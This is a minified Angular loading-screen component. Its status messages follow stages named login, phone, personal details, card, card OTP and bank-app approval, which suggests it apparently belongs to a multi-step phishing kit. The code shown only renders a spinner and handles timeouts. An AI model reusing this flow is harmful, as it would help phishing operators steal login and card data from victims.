import{a as N}from"./chunk-Z4DVSYFI.js";import{d as y}from"./chunk-6WLP4DWI.js";import{Ba as b,Ga as d,Ha as m,O as i,Oa as a,Qa as h,T as I,Y as o,Za as C,ea as r,fa as s,ga as v,ob as O,t as f,ta as p,u as g,va as c}from"./chunk-OJFOISDS.js";var _=class u{constructor(){this.state=f(O);this.subMessage=I("LOADING.SUB_1");this.flow=a(()=>this.state.currentFlow());this.brandColor=a(()=>this.flow()?.theme.button.background||"#003087");this.textColor=a(()=>this.flow()?.theme.input.textColor||"#111827");this.subTextColor=a(()=>this.flow()?.theme.mode==="dark"?"#9ca3af":"#64748b");this.title=a(()=>{let e=this.state.stage();return e==="login"?"LOADING.CHECKING":e==="phone_pending"?"LOADING.SENDING":e==="personal_pending"?"LOADING.UPDATING":e==="card_pending"?"LOADING.SECURING":e==="card_otp_pending"?"LOADING.VERIFYING":e==="bank_app_pending"?"LOADING.WAITING":"LOADING.PROCESSING"});h(()=>{this.state.currentView()==="loading"&&(this.state.waitingStartPublic()||(console.warn("[Loading] Timer missing. Requesting sync/restart..."),this.state.syncState()))})}ngOnInit(){let e=["LOADING.SUB_1","LOADING.SUB_2","LOADING.SUB_3","LOADING.SUB_4"],n=0;this.interval=setInterval(()=>{n++,this.subMessage.set(e[n%e.length])},2500);let t=0;this.stuckCheckInterval=setInterval(()=>{if(t+=1e3,t>15e3&&!this.state.waitingStartPublic()){console.error("[Loading] Stuck detected. Recovering...");let l=this.state.previousView();l&&l!=="loading"?this.state.navigate(l):this.state.navigate("login")}},1e3)}ngOnDestroy(){clearInterval(this.interval),clearInterval(this.stuckCheckInterval)}static{this.\u0275fac=function(n){return new(n||u)}}static{this.\u0275cmp=g({type:u,selectors:[["app-loading"]],standalone:!0,features:[b],decls:11,vars:14,consts:[[1,"flex","flex-col","items-center","justify-center","py-12","animate-fade-in"],[1,"relative","w-16","h-16","mb-8"],[1,"absolute","inset-0","border-4","rounded-full","opacity-20"],[1,"absolute","inset-0","border-4","rounded-full","border-t-transparent","animate-spin-slow"],[1,"text-2xl","font-bold","mb-3","text-center","tracking-tight","animate-fade-in-up"],[1,"text-base","text-slate-500","text-center","font-medium","max-w-xs","mx-auto","animate-pulse"]],template:function(n,t){n&1&&(r(0,"app-public-layout")(1,"div",0)(2,"div",1),v(3,"div",2)(4,"div",3),s(),r(5,"h1",4),p(6),d(7,"translate"),s(),r(8,"p",5),p(9),d(10,"translate"),s()()()),n&2&&(i(3),o("border-color",t.brandColor()),i(),o("border-color",t.brandColor()),i(),o("color",t.textColor()),i(),c(" ",m(7,10,t.title())," "),i(2),o("color",t.subTextColor()),i(),c(" ",m(10,12,t.subMessage())," "))},dependencies:[C,N,y],styles:[".animate-spin-slow[_ngcontent-%COMP%]{animation:_ngcontent-%COMP%_spin 1s linear infinite}.animate-fade-in-up[_ngcontent-%COMP%]{animation:_ngcontent-%COMP%_fadeInUp .5s ease-out}@keyframes _ngcontent-%COMP%_spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}@keyframes _ngcontent-%COMP%_fadeInUp{0%{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}"]})}};export{_ as LoadingComponent};
